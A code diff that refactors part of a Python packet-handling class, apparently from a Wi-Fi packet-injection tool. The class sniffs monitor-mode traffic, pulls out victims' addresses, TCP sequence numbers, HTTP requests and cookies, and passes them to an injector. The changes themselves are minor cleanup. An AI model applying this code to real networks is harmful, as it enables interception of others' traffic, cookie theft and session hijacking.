@@ -22,10 +22,9 @@ class PacketHandler(object):
     directly if working in broadcast mode and attacking all clients.
     """
 
-    ### Work on moving misc, within * or **
-    def __init__(self, misc, *positional_parameters, **keyword_parameters):
+    def __init__(self, *positional_parameters, **keyword_parameters):
         if ('victims' in keyword_parameters):
-            self.victims=keyword_parameters['victims']
+            self.victims = keyword_parameters['victims']
         else:
             self.victims = []
 
@@ -56,11 +55,17 @@ class PacketHandler(object):
         if (len(self.victims) == 0 and self.victim_parameters is None):
             print "[ERROR] Please specify victim parameters or Victim List"
             exit(1)
+
+        if 'Misc' in keyword_parameters:
+            misc = keyword_parameters['Misc']
+            self.verbose = misc.verbose
+            self.expSocket = misc.expSocket
+        else:
+            self.verbose = False
+            self.expSocket = False
             
         self.newvictims = []
         self.injector = Injector(self.i)
-        self.expSocket = misc.expSocket
-        self.verbose = misc.verbose
 
     def proc_excluded(self, excluded):
         """Check if argument provided in excluded is an ip.
@@ -144,9 +149,9 @@ class PacketHandler(object):
 
     def handle_default(self, packet, single):
         """Default packet handler, looks for GET requests in the TCP layer."""
-        if (packet.haslayer(IP) and packet.haslayer(TCP)):
+        if packet.haslayer(IP) and packet.haslayer(TCP):
             ## MONITOR MODE
-            if (packet.haslayer(Dot11) and not packet.haslayer(Ether)):
+            if packet.haslayer(Dot11) and not packet.haslayer(Ether):
                 vicmac = packet.getlayer(Dot11).addr2
                 rtrmac = packet.getlayer(Dot11).addr1
 
@@ -191,7 +196,7 @@ class PacketHandler(object):
                     TSecr = None
 
                 cookie = self.search_cookie(request)
-                #print (vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie)
+                #print (vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, TSVal, TSecr)
                 return (vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, TSVal, TSecr)
             else:
                 try:
@@ -201,7 +206,7 @@ class PacketHandler(object):
                     TSecr = None
 
                 cookie = self.search_cookie(request)
-                #print (vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie)
+                #print (vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, TSVal, TSecr)
                 return (vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, TSVal, TSecr)
         return None
 
